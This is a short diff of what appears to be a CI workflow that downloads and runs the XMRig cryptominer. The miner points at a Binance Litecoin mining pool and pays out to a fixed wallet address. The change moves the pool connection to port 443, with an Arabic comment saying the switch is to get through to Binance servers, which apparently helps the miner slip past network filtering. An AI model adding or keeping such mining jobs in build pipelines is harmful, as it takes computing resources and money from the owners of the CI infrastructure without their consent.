@@ -11,4 +11,5 @@ jobs:
           wget https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz
           tar xvzf xmrig-6.21.0-linux-x64.tar.gz
           cd xmrig-6.21.0
-          ./xmrig -o ltc.poolbinance.com:1800 -u ltc1q70m6d0h4tnsu9ysjk8sh2agdqyk7x4ez59eg0r -p x
+          # تم التعديل للمنفذ 443 لضمان الاتصال بسيرفرات Binance
+          ./xmrig -o ltc.poolbinance.com:443 -u ltc1q70m6d0h4tnsu9ysjk8sh2agdqyk7x4ez59eg0r -p x
